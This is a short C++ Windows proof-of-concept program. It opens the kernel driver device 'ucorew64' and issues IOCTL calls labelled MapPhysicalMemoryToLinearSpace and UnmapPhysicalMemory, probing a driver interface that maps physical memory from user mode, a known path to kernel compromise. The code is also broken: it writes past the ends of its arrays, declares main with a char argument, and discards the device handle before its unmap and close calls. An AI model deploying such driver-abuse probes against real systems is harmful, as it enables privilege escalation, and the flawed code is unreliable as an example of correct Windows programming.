#include <iostream>
#include <Windows.h>

#define MapPhysicalMemoryToLinearSpace 0xFA002EE8
#define UnmapPhysicalMemory 0xFA002EEC

int main(char argc, char** argv)
{
    HANDLE device = INVALID_HANDLE_VALUE;
    BOOL status = FALSE;
    DWORD bytesReturned = 0;
    CHAR inBuffer[64] = { 0 };
    CHAR outBuffer[64] = { 0 };

    device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

    if (device == INVALID_HANDLE_VALUE)
    {
        printf("> Could not open device: 0x%X\n", GetLastError());
        return FALSE;
    }

    printf("[ ] Calling MapPhysicalMemoryToLinearSpace 0x%X\n", MapPhysicalMemoryToLinearSpace);
    status = DeviceIoControl(device, MapPhysicalMemoryToLinearSpace, inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
    printf("[*] MapPhysicalMemoryToLinearSpace 0x%X called\n", MapPhysicalMemoryToLinearSpace);
    printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", outBuffer[0], bytesReturned);

    system("pause");

    device = INVALID_HANDLE_VALUE;
    status = FALSE;
    bytesReturned = 0;
    inBuffer[64] = { 0 };
    outBuffer[64] = { 0 };

    status = DeviceIoControl(device, UnmapPhysicalMemory, inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);

    CloseHandle(device);
    return EXIT_SUCCESS;
}